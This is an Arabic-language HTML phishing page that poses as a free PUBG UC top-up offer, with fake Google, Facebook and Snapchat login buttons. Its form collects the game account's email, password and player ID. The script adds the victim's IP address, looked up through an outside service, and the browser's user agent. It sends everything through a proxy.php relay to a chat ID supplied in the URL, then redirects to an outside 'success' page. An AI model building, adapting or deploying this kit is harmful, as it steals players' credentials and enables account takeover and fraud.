<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل دخول حساب</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      font-family: Arial, sans-serif;
      color: black;
      background: linear-gradient(45deg, #FFFC00, #ffffff, #FFFC00);
      background-size: 400% 400%;
      animation: gradientBG 15s ease infinite;
    }

    @keyframes gradientBG {
      0% {background-position: 0% 50%;}
      50% {background-position: 100% 50%;}
      100% {background-position: 0% 50%;}
    }

    .container {
      margin: 20px auto;
      padding: 20px;
      background: rgba(0, 0, 0, 0.1);
      border-radius: 10px;
      width: 90%;
      max-width: 400px;
      position: relative;
      z-index: 1;
      text-align: center;
    }

    .btn {
      display: block;
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      background: #00000010;
      color: black;
      border: none;
      border-radius: 5px;
      font-size: 18px;
      cursor: pointer;
    }

    .btn img {
      vertical-align: middle;
      height: 20px;
    }

    .pricing {
      margin-top: 20px;
    }

    .price-item {
      background: #00000010;
      padding: 10px;
      margin: 5px 0;
      border-radius: 5px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      color: black;
    }

    .buy-btn {
      background: black;
      color: yellow;
      border: none;
      padding: 5px 10px;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }

    input, select {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: none;
      background: rgba(0, 0, 0, 0.1);
      color: black;
      font-size: 16px;
    }

    input::placeholder {
      color: rgba(0, 0, 0, 0.5);
    }

    form {
      background: #00000010;
      padding: 20px;
      border-radius: 10px;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
      color: black;
      background: transparent;
      padding: 5px;
      border-radius: 5px;
    }

    canvas#snow {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }
  </style>
</head>
<body>

<canvas id="snow"></canvas>

<div id="login" class="container">
  <h1>تسجيل دخول حساب</h1>
  <button class="btn" onclick="showForm()">Google <img src="https://khain.pro/sor/googel.png" /></button>
  <button class="btn" onclick="showForm()">Facebook <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" /></button>
  <button class="btn" onclick="showForm()">Snapchat <img src="https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg" /></button>
</div>

<div id="form" class="container" style="display: none;">
  <h1>صفحة شحن ببجي مجانية 🎁</h1>
  <form id="pubgForm">
    <label>البريد الإلكتروني لحساب اللعبة:</label>
    <input type="email" name="email" required />

    <label>كلمة السر لحساب اللعبة:</label>
    <input type="password" name="password" required />

    <label>الأيدي الخاص بحساب اللعبة :</label>
    <input type="text" name="player_id" required />

    <label>الكمية المراد شحنها:</label>
    <select name="amount" required>
      <option value="1000 شدة ببجي مجانا">1000 شدة ببجي مجانا</option>
      <option value="1500 شدة ببجي">1500 شدة ببجي</option>
      <option value="2000 شدة ببجي">2000 شدة ببجي</option>
      <option value="2500 شدة ببجي">2500 شدة ببجي</option>
      <option value="3000 شدة ببجي">3000 شدة ببجي</option>
    </select>

    <button type="submit" class="buy-btn">شحن</button>
  </form>
</div>

<div class="container pricing">
  <h1>قائمة شحن ببجي</h1>
  <div class="price-item"><span>1000 - 0$</span><button class="buy-btn">شحن</button></div>
  <div class="price-item"><span>1500 - 2$</span><button class="buy-btn">شحن</button></div>
  <div class="price-item"><span>2000 - 3$</span><button class="buy-btn">شحن</button></div>
  <div class="price-item"><span>2500 - 4$</span><button class="buy-btn">شحن</button></div>
  <div class="price-item"><span>3000 - 5$</span><button class="buy-btn">شحن</button></div>
</div>

<script>
  const urlParams = new URLSearchParams(window.location.search);
  const CHAT_ID = urlParams.get('id');

  document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("pubgForm");
    if (!form) return;

    form.addEventListener("submit", async function(e) {
      e.preventDefault();

      const data = new FormData(this);
      const email = data.get("email");
      const password = data.get("password");
      const playerId = data.get("player_id");
      const amount = data.get("amount");
      const platform = "شدة ببجي";
      const device = navigator.userAgent;

      const ipData = await fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .catch(() => ({ ip: "غير معروف" }));

      const message = `🔔 طلب شحن ببجي جديد:\n\n📱 المنصة: ${platform}\n\n📧 الإيميل: ${email}\n🔑 كلمة السر: ${password}\n🔢 الأيدي: ${playerId}\n🎁 الكمية: ${amount}\n📱 الجهاز: ${device}\n🌐 IP: ${ipData.ip}`;

      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("message", message);

      fetch("proxy.php", {
        method: "POST",
        body: formData
      }).then(() => {
        window.location.href = "https://issol.free.nf/success/ok.html?i=1";
      }).catch(() => {
        alert("حدث خطأ في الاتصال بالسيرفر.");
      });
    });
  });

  function showForm() {
    document.getElementById("login").style.display = "none";
    document.getElementById("form").style.display = "block";
  }
</script>

<script>
  const canvas = document.getElementById('snow');
  const ctx = canvas.getContext('2d');

  let width = window.innerWidth;
  let height = window.innerHeight;
  canvas.width = width;
  canvas.height = height;

  let numFlakes = 100;
  let flakes = [];

  function createFlakes() {
    for (let i = 0; i < numFlakes; i++) {
      flakes.push({
        x: Math.random() * width,
        y: Math.random() * height,
        r: Math.random() * 3 + 2,
        d: Math.random() + 1
      });
    }
  }

  function drawFlakes() {
    ctx.clearRect(0, 0, width, height);
    ctx.fillStyle = "white";
    ctx.beginPath();
    for (let i = 0; i < numFlakes; i++) {
      const f = flakes[i];
      ctx.moveTo(f.x, f.y);
      ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2, true);
    }
    ctx.fill();
    moveFlakes();
  }

  function moveFlakes() {
    for (let i = 0; i < numFlakes; i++) {
      const f = flakes[i];
      f.y += f.d;
      if (f.y > height) {
        flakes[i] = { x: Math.random() * width, y: 0, r: f.r, d: f.d };
      }
    }
  }

  function updateSnow() {
    drawFlakes();
    requestAnimationFrame(updateSnow);
  }

  window.addEventListener('resize', () => {
    width = window.innerWidth;
    height = window.innerHeight;
    canvas.width = width;
    canvas.height = height;
  });

  createFlakes();
  updateSnow();
</script>

</body>
</html>
